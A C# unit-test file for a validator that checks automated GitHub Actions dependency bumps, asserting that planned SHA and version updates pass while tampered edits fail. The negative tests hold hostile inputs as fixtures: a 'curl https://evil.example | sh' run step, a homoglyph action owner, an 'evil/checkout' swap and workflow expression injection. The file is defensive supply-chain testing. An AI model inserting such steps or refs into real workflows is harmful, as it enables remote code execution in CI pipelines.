using CodeCoverage.Git.MergeQueue.Resolution;
using CodeCoverage.GitWriter.Jobs;
using CodeCoverage.GitWriter.Jobs.Dependencies;
using CodeCoverage.GitWriter.Tests._Infrastructure;

namespace CodeCoverage.GitWriter.Tests;

/// <summary>
/// The R15 carve-out under the <c>dependencies</c> profile (docs/code-coverage/dependency-updates-PRD.md gap C,
/// §13.11.3 #7–#10): <see cref="WorkflowRefPatchRule"/> on the lines, then <see cref="GitHubWorkflowValidator"/> on the
/// files before and after, on patches written by real <c>git diff</c>. The positive real capture is in
/// <see cref="DependencyPatchProfileTests"/> (actions/uses-sha-and-tag-textedit.diff).
/// </summary>
public class WorkflowRefPatchRuleTests : IDisposable
{
    private const string Ci = ".github/workflows/ci.yml";
    private const string OldSha = "b4ffde65f46336ab88eb53be808477a3936bae11";
    private const string NewSha = "692973e3d937129bcbf40652eb9f2f61becf3332";
    private const string OtherSha = "1111111111111111111111111111111111111111";

    private const string Workflow =
        "name: ci\n" +
        "on: [pull_request]\n" +
        "jobs:\n" +
        "  build:\n" +
        "    runs-on: ubuntu-latest\n" +
        "    steps:\n" +
        $"      - uses: actions/checkout@{OldSha} # v4.1.1\n" +
        "      - uses: actions/setup-node@v4\n" +
        "        with:\n" +
        "          node-version: 20\n" +
        "          cache: npm\n" +
        "      - run: npm ci\n";

    private static readonly DependencyPlanEntry Checkout = new("actions/checkout", Ci, "v4.1.1", "v4.1.7", "actions", "github-tags")
    {
        CurrentDigest = OldSha,
        NewDigest = NewSha,
    };

    private static readonly DependencyPlanEntry Node = new("node", Ci, "20", "22", "node", "github-releases") { PackageName = "actions/node-versions" };

    private readonly BaseRepo repo = new();

    public void Dispose() => repo.Dispose();

    private async Task<DependencyPatchVerdict> Validate(string before, string after, params DependencyPlanEntry[] plan)
        => await Validate(Ci, before, after, plan);

    private async Task<DependencyPatchVerdict> Validate(string path, string before, string after, params DependencyPlanEntry[] plan)
    {
        var from = repo.Commit((path, before));
        var to = repo.Change(from, (path, after));
        return await DependencyPatchValidator.ValidateAsync(repo.Diff(from, to), new DependencyPatchRequest(plan), repo.Tree(from));
    }

    private static string Bump(string text) => text.Replace($"actions/checkout@{OldSha} # v4.1.1", $"actions/checkout@{NewSha} # v4.1.7", StringComparison.Ordinal);

    [Fact]
    public async Task A_planned_sha_bump_with_its_comment_passes_and_asks_for_the_workflows_permission()
    {
        var verdict = await Validate(Workflow, Bump(Workflow), Checkout);

        verdict.Detail.Should().BeNull();
        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        verdict.RequiresWorkflowsPermission.Should().BeTrue();
        verdict.AppliedGroups.Should().Equal("actions");
    }

    [Fact]
    public async Task A_planned_setup_action_version_passes()
    {
        var verdict = await Validate(Workflow, Workflow.Replace("node-version: 20", "node-version: 22", StringComparison.Ordinal), Node);

        verdict.Detail.Should().BeNull();
        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        verdict.AppliedGroups.Should().Equal("node");
    }

    [Fact]
    public async Task A_composite_action_outside_the_workflows_directory_passes_without_the_workflows_permission()
    {
        const string path = ".github/actions/setup/action.yml";
        const string action =
            "name: setup\n" +
            "runs:\n" +
            "  using: composite\n" +
            "  steps:\n" +
            "    - uses: actions/setup-dotnet@v4\n" +
            "      with:\n" +
            "        dotnet-version: 8.0.x\n";
        var plan = new DependencyPlanEntry("dotnet-sdk", path, "8.0.x", "9.0.x", "dotnet", "dotnet-version");

        var verdict = await Validate(path, action, action.Replace("8.0.x", "9.0.x", StringComparison.Ordinal), plan);

        verdict.Detail.Should().BeNull();
        verdict.Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        verdict.RequiresWorkflowsPermission.Should().BeFalse();
    }

    [Fact]
    public async Task Another_file_under_github_is_never_writable()
    {
        const string path = ".github/dependabot.yml";
        var verdict = await Validate(path, "version: 2\n", "version: 3\n", Checkout with { PackageFile = path });

        verdict.Reason.Should().Be(PatchReasons.UnsafePath);
    }

    // §13.11.3 #7: a uses: bump plus an added run: in the same hunk.
    [Fact]
    public async Task A_uses_bump_with_an_added_run_step_is_refused()
    {
        var after = Bump(Workflow).Replace($"# v4.1.7\n", "# v4.1.7\n      - run: curl https://evil.example | sh\n", StringComparison.Ordinal);

        var verdict = await Validate(Workflow, after, Checkout);

        verdict.Reason.Should().Be(DependencyPatchReasons.WorkflowEdit);
    }

    // §13.11.3 #7: a Cyrillic homoglyph in owner/repo (U+0430 for 'a').
    [Fact]
    public async Task A_homoglyph_owner_is_refused()
    {
        var after = Bump(Workflow).Replace("actions/checkout@", "\u0430ctions/checkout@", StringComparison.Ordinal);

        var verdict = await Validate(Workflow, after, Checkout);

        verdict.Reason.Should().Be(DependencyPatchReasons.WorkflowEdit);
    }

    // §13.11.3 #7: ./local → remote, and remote → docker://.
    [Theory]
    [InlineData("      - uses: ./.github/actions/local\n", $"      - uses: actions/checkout@{NewSha} # v4.1.7\n")]
    [InlineData($"      - uses: actions/checkout@{OldSha} # v4.1.1\n", "      - uses: docker://alpine:3.18\n")]
    [InlineData($"      - uses: actions/checkout@{OldSha} # v4.1.1\n", $"      - uses: evil/checkout@{NewSha} # v4.1.7\n")]
    public async Task A_uses_that_changes_more_than_its_ref_is_refused(string oldLine, string newLine)
    {
        var before = Workflow.Replace($"      - uses: actions/checkout@{OldSha} # v4.1.1\n", oldLine, StringComparison.Ordinal);
        var after = Workflow.Replace($"      - uses: actions/checkout@{OldSha} # v4.1.1\n", newLine, StringComparison.Ordinal);

        var verdict = await Validate(before, after, Checkout);

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Rejected);
        verdict.Reason.Should().Be(DependencyPatchReasons.WorkflowEdit);
    }

    [Fact]
    public async Task A_comment_other_than_the_planned_version_is_refused()
    {
        var after = Bump(Workflow).Replace("# v4.1.7", "# v4.1.7 trusted", StringComparison.Ordinal);

        var verdict = await Validate(Workflow, after, Checkout);

        verdict.Reason.Should().Be(DependencyPatchReasons.WorkflowEdit);
    }

    // §13.11.3 #8: a with: key outside the closed list, an expression, a block scalar.
    [Theory]
    [InlineData("          cache: npm\n", "          cache: yarn\n")]
    [InlineData("          node-version: 20\n", "          node-version: '${{github.event.x}}'\n")]
    [InlineData("          node-version: 20\n", "          node-version: ${{ github.event.x }}\n")]
    [InlineData("          node-version: 20\n", "          node-version: |\n")]
    public async Task A_with_change_outside_the_closed_version_inputs_is_refused(string oldLine, string newLine)
    {
        var verdict = await Validate(Workflow, Workflow.Replace(oldLine, newLine, StringComparison.Ordinal), Node, Node with { CurrentValue = "npm", NewValue = "yarn" });

        verdict.Outcome.Should().Be(DependencyPatchOutcome.Rejected);
        verdict.Reason.Should().Be(DependencyPatchReasons.WorkflowEdit);
    }

    [Fact]
    public async Task A_version_key_under_an_action_outside_the_closed_list_is_refused()
    {
        var before = Workflow.Replace("actions/setup-node@v4", "someone/setup-anything@v1", StringComparison.Ordinal);

        var verdict = await Validate(before, before.Replace("node-version: 20", "node-version: 22", StringComparison.Ordinal), Node);

        verdict.Reason.Should().Be(PatchReasons.InvalidContent);
    }

    [Fact]
    public async Task A_version_change_nobody_planned_is_refused()
    {
        var verdict = await Validate(Workflow, Workflow.Replace("node-version: 20", "node-version: 23", StringComparison.Ordinal), Node);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
    }

    // §13.11.3 #9: flow style, uses: text inside run: |, anchors and aliases.
    [Fact]
    public async Task A_changed_value_inside_a_flow_mapping_is_refused()
    {
        var before = Workflow.Replace("        with:\n          node-version: 20\n          cache: npm\n", "        with: {\n          cache: npm,\n          node-version: 20\n          }\n", StringComparison.Ordinal);

        var verdict = await Validate(before, before.Replace("node-version: 20", "node-version: 22", StringComparison.Ordinal), Node);

        verdict.Reason.Should().Be(PatchReasons.InvalidContent);
        verdict.Detail.Should().Contain("flow style");
    }

    [Fact]
    public async Task A_uses_line_inside_a_run_block_is_refused()
    {
        var before = Workflow.Replace("      - run: npm ci\n", $"      - run: |\n          echo hi\n          uses: actions/checkout@{OldSha} # v4.1.1\n", StringComparison.Ordinal);
        var after = before.Replace($"          uses: actions/checkout@{OldSha} # v4.1.1\n", $"          uses: actions/checkout@{NewSha} # v4.1.7\n", StringComparison.Ordinal);

        var verdict = await Validate(before, after, Checkout);

        verdict.Reason.Should().Be(PatchReasons.InvalidContent);
    }

    [Fact]
    public async Task A_change_under_an_anchor_that_an_alias_repeats_is_refused()
    {
        const string before =
            "on: push\n" +
            "jobs:\n" +
            "  a:\n" +
            "    runs-on: ubuntu-latest\n" +
            "    steps:\n" +
            "      - uses: actions/setup-node@v4\n" +
            "        with: &node\n" +
            "          node-version: 20\n" +
            "  b:\n" +
            "    runs-on: ubuntu-latest\n" +
            "    steps:\n" +
            "      - uses: actions/setup-node@v4\n" +
            "        with: *node\n";

        var verdict = await Validate(before, before.Replace("node-version: 20", "node-version: 22", StringComparison.Ordinal), Node);

        verdict.Reason.Should().Be(PatchReasons.InvalidContent);
    }

    // §13.11.3 #10: the runner resolved the tag to another SHA (a moved tag).
    [Fact]
    public async Task A_sha_other_than_the_one_the_bot_resolved_is_refused()
    {
        var verdict = await Validate(Workflow, Workflow.Replace($"actions/checkout@{OldSha} # v4.1.1", $"actions/checkout@{OtherSha} # v4.1.7", StringComparison.Ordinal), Checkout);

        verdict.Reason.Should().Be(DependencyPatchReasons.WorkflowRef);
    }

    [Fact]
    public async Task A_tag_pinned_line_may_take_the_planned_tag_or_the_bots_sha_and_nothing_else()
    {
        var before = Workflow.Replace($"actions/checkout@{OldSha} # v4.1.1", "actions/checkout@v4.1.1", StringComparison.Ordinal);

        (await Validate(before, before.Replace("checkout@v4.1.1", "checkout@v4.1.7", StringComparison.Ordinal), Checkout)).Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        (await Validate(before, before.Replace("checkout@v4.1.1", $"checkout@{NewSha} # v4.1.7", StringComparison.Ordinal), Checkout)).Outcome.Should().Be(DependencyPatchOutcome.Accepted);
        (await Validate(before, before.Replace("checkout@v4.1.1", $"checkout@{OtherSha} # v4.1.7", StringComparison.Ordinal), Checkout)).Reason.Should().Be(DependencyPatchReasons.WorkflowRef);
        (await Validate(before, before.Replace("checkout@v4.1.1", "checkout@main", StringComparison.Ordinal), Checkout)).Reason.Should().Be(DependencyPatchReasons.WorkflowRef);
    }

    [Fact]
    public async Task A_uses_bump_nobody_planned_is_refused()
    {
        var verdict = await Validate(Workflow, Workflow.Replace("actions/setup-node@v4", "actions/setup-node@v5", StringComparison.Ordinal), Checkout);

        verdict.Reason.Should().Be(DependencyPatchReasons.UnplannedChange);
    }

    [Fact]
    public async Task A_workflow_bump_checks_with_keys_against_the_target_action_yml()
    {
        var from = repo.Commit((Ci, Workflow));
        var to = repo.Change(from, (Ci, Workflow.Replace("actions/setup-node@v4", $"actions/setup-node@{NewSha} # v5", StringComparison.Ordinal)));
        var plan = new DependencyPlanEntry("actions/setup-node", Ci, "v4", "v5", "setup-node", "github-tags") { NewDigest = NewSha };
        const string target = "name: x\ninputs:\n  node-version:\n    required: false\nruns:\n  using: node24\n  main: index.js\n";

        var verdict = await DependencyPatchValidator.ValidateAsync(repo.Diff(from, to),
            new DependencyPatchRequest([plan]) { TargetActions = new Dictionary<string, string> { [$"actions/setup-node@{NewSha}"] = target } }, repo.Tree(from));

        verdict.Reason.Should().Be(PatchReasons.InvalidContent);
        verdict.Detail.Should().Contain("does not declare as an input");
    }
}
